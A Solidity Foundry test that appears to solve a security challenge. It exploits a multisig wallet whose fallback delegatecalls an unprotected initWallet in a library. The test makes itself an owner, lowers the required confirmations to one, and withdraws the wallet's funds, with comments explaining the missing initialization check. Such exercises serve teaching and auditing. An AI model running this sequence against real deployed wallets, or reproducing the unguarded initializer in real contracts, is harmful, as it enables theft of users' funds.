// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";
import "src/Wallet.sol";
import "src/WalletLibrary.sol";

contract WalletTest is BaseTest {
    Wallet private wallet;
    WalletLibrary private walletLibrary;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        wallet = Wallet(payable(0x19c80e4Ec00fAAA6Ca3B41B17B75f7b0F4D64CB7));
        walletLibrary = WalletLibrary(payable(0x43FF315d0003365fe1246344115A3142b9EBfe0b));

        vm.label(address(wallet), "Wallet");
        vm.label(address(walletLibrary), "WalletLibrary");

        // We are funding the Wallet contract with 1 wei just to test the transaction that will allow us to withdraw from it!
        vm.deal(address(wallet), 1);
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player);

        // prepare the attack
        address[] memory owners = new address[](1);
        owners[0] = player;

        // call the `wallet.fallback` function passing the correct data to make it make a
        // delegatecall to walletLibrary that will execute initWallet on Wallet's context
        // initWallet should be protected by a flag that check if the contract has been initialized or not
        // like require(owners.length == 0)
        // by doing so we have been added to the list of owners
        // but we can execute any transaction we want because we have lowered the amount of needed confirmation request
        // required to only 1
        (bool success, ) = address(wallet).call(abi.encodeWithSignature("initWallet(address[],uint256)", owners, 1));

        assertEq(success, true);
        assertEq(wallet.numConfirmationsRequired(), 1);
        assertEq(wallet.owners(3), player);

        // Now I'm one of the owners and because numConfirmationsRequired = 1 I can execute tx
        // Let's create a transaction.
        (success, ) = address(wallet).call(
            abi.encodeWithSignature("submitTransaction(address,uint256,bytes)", player, 1, "")
        );
        assertEq(success, true);

        // Confirm the transaction we just created
        // At the moment of the creation of our transaction the transaction array was empty
        // So our txIndex is 0
        uint256 txIndex = 0;
        (success, ) = address(wallet).call(abi.encodeWithSignature("confirmTransaction(uint256)", txIndex));
        assertEq(success, true);

        // Execute the transaction
        uint256 playerBalanceBefore = player.balance;
        (success, ) = address(wallet).call(abi.encodeWithSignature("executeTransaction(uint256)", txIndex));
        assertEq(success, true);

        // Assert that we have received 1 wei from the Wallet contract
        assertEq(playerBalanceBefore + 1, player.balance);

        vm.stopPrank();
    }
}
